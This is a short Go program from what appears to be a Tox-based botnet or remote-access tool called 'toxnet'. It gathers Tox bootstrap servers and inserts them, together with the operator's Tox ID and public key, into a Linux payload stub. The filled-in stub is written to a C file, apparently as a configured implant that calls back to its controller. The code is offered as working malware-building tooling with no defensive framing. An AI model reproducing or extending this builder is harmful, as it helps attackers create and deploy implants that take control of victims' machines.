package main

import (
    "fmt"
    "io/ioutil"
    "strings"
    "strconv"
    
    "github.com/0x4meliorate/toxnet/net"
    "github.com/0x4meliorate/toxnet/payloads"
)

func main() {
    // The net package's init() will run automatically when imported
    // So net.Tox_instance should be initialized already
    
    if net.Tox_instance == nil {
        fmt.Println("[-] Failed to initialize Tox instance")
        return
    }
    
    servers := net.GetBootstraps()
    var bootstraps []string
    for _, server := range servers.Nodes {
        if server.StatusTCP || server.StatusUDP {
            bootstraps = append(bootstraps, "\t{\""+server.Ipv4+"\","+strconv.Itoa(server.Port)+",\""+server.PublicKey+"\"}")
        }
    }
    
    stub := payloads.Linux_stub
    stub = strings.Replace(stub, "TOXNET_REPLACE_ME_BOOTSTRAPS", strings.Join(bootstraps, ",\n"), -1)
    stub = strings.Replace(stub, "TOXNET_REPLACE_ME_TOX_ID", net.Tox_instance.SelfGetAddress(), -1)
    stub = strings.Replace(stub, "TOXNET_REPLACE_ME_PUB_KEY", net.Tox_instance.SelfGetPublicKey(), -1)
    
    err := ioutil.WriteFile("temp_linux_stub.c", []byte(stub), 0666)
    if err != nil {
        fmt.Println("[-] Error writing stub:", err)
        return
    }
    
    fmt.Println("[+] temp_linux_stub.c created")
}
